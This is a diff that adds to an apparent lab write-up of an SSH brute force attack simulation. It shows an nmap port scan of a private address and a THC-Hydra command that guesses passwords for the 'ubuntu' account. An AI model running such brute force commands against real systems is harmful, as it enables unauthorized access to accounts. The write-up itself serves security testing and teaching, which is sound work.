@@ -49,3 +49,20 @@ The attacker first verified SSH service availability on the target system.
 
 ```bash
 nmap -p 22 10.0.0.95
+
+### Result
+PORT STATE SERVICE
+22/tcp open ssh
+
+This confirmed that the SSH service was exposed and accessible, making it a viable target for brute force attack simulation.
+
+### 4.2 Brute Force Execution
+
+After confirming service availability, the attacker launched a credential brute force attack against the SSH service using THC-Hydra.
+
+```bash
+hydra -l ubuntu -P passwords.txt ssh://10.0.0.95
+
+
+
+
